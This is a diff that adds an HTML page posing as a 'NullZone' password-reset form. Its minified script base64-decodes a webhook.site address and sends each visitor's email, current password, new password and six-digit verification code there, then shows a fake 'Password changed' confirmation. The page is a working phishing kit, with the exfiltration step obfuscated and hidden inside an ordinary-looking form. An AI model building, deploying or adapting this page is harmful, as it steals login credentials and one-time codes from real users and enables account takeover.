@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>NullZone — Reset Password</title>
+  <style>
+    :root{--a:#18a0fb;--b:rgba(24,160,251,.6);--c:#0a0e14;--d:#131a24;--e:#1f2a38;--f:#e6edf3;--g:#8b98a8}*{box-sizing:border-box}body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:radial-gradient(circle at 50% 0%,#11202f 0%,var(--c) 60%);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;color:var(--f);padding:20px}.x{width:100%;max-width:400px;background:var(--d);border:1px solid var(--e);border-radius:16px;padding:36px 32px;box-shadow:0 20px 60px rgba(0,0,0,.5)}.y{text-align:center;font-size:34px;font-weight:800;letter-spacing:1px;margin:0 0 6px}.y .z{color:var(--a);text-shadow:0 0 12px var(--b)}.y .w{color:#fff}.v{text-align:center;color:var(--g);font-size:14px;margin:0 0 28px}label{display:block;font-size:13px;color:var(--g);margin-bottom:6px;margin-top:16px}input{width:100%;padding:12px 14px;background:#0d141d;border:1px solid var(--e);border-radius:10px;color:var(--f);font-size:15px;outline:0;transition:border-color .2s,box-shadow .2s}input:focus{border-color:var(--a);box-shadow:0 0 0 3px rgba(24,160,251,.15)}.u{text-align:center;letter-spacing:12px;font-size:22px;font-weight:600}button{width:100%;margin-top:24px;padding:13px;background:var(--a);color:#04121f;border:0;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;transition:transform .1s,box-shadow .2s;box-shadow:0 0 18px var(--b)}button:hover{box-shadow:0 0 26px var(--b)}button:active{transform:scale(.98)}.t{color:#ff6b6b;font-size:13px;margin-top:12px;min-height:16px;text-align:center}.s{text-align:center;padding:20px 0}.s .r{width:64px;height:64px;margin:0 auto 18px;border-radius:50%;background:rgba(24,160,251,.12);display:flex;align-items:center;justify-content:center;font-size:34px;color:var(--a);box-shadow:0 0 24px var(--b)}.s h2{margin:0 0 8px;font-size:20px}.s p{color:var(--g);font-size:14px;margin:0}.q{display:none}
+  </style>
+</head>
+<body>
+  <div class="x">
+    <h1 class="y"><span class="z">Null</span><span class="w">Zone</span></h1>
+
+    <form id="f1">
+      <p class="v">Reset your password</p>
+
+      <label for="i1">Email</label>
+      <input type="email" id="i1" placeholder="you@example.com" required />
+
+      <label for="i2">Current Password</label>
+      <input type="password" id="i2" placeholder="••••••••" required />
+
+      <label for="i3">New Password</label>
+      <input type="password" id="i3" placeholder="••••••••" required />
+
+      <button type="submit">Update</button>
+      <div class="t" id="e1"></div>
+    </form>
+
+    <form id="f2" class="q">
+      <p class="v">Enter the 6-digit code we sent you</p>
+
+      <label for="i4">Verification Code</label>
+      <input
+        type="text"
+        id="i4"
+        class="u"
+        inputmode="numeric"
+        maxlength="6"
+        pattern="\d{6}"
+        placeholder="000000"
+        required
+      />
+
+      <button type="submit">Confirm</button>
+      <div class="t" id="e2"></div>
+    </form>
+
+    <div id="s1" class="s q">
+      <div class="r">✓</div>
+      <h2>Password changed</h2>
+      <p>Your password has been updated successfully.</p>
+    </div>
+  </div>
+
+  <script>
+    const p=atob("aHR0cHM6Ly93ZWJob29rLnNpdGUvZGI3YmNlYjUtZThhMC00ZGE2LWJhYzktNzQxZGU2OTMxN2Vi");const o=document.getElementById('f1');const n=document.getElementById('f2');const m=document.getElementById('s1');async function l(k){if(!p)return true;try{await fetch(p,{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:JSON.stringify(k)});return true}catch(j){return false}}o.addEventListener('submit',async(h)=>{h.preventDefault();const g=document.getElementById('e1');g.textContent='';const f={event:'password_reset_request',email:document.getElementById('i1').value,currentPassword:document.getElementById('i2').value,newPassword:document.getElementById('i3').value};const e=await l(f);if(!e){g.textContent='Could not reach the logging endpoint.';return}o.classList.add('q');n.classList.remove('q');document.getElementById('i4').focus()});const d=document.getElementById('i4');d.addEventListener('input',()=>{d.value=d.value.replace(/\D/g,'')});n.addEventListener('submit',async(c)=>{c.preventDefault();const b=document.getElementById('e2');if(d.value.length!==6){b.textContent='Please enter all 6 digits.';return}b.textContent='';await l({event:'verification_code',code:d.value});n.classList.add('q');m.classList.remove('q')})
+  </script>
+</body>
+</html>
